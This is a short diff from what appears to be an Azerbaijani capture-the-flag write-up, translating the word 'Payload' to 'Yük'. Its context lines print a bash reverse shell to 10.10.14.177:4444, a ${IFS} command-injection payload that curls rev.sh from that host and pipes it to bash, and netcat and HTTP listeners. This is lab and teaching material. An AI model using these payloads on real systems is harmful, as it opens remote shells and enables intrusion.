@@ -23,7 +23,7 @@ Kəşfiyyat
 
 Command Injection (${IFS})
 ├── rev.sh: bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
-├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
+├── Yük: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
 └── shell as app
 
 Giriş Məlumatlarının Sızması (JAR → PostgreSQL)
@@ -124,7 +124,7 @@ python3 -m http.server 7000
 nc -lvnp 4444
 ```
 
-Payload:
+Yük:
 
 ```
 test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
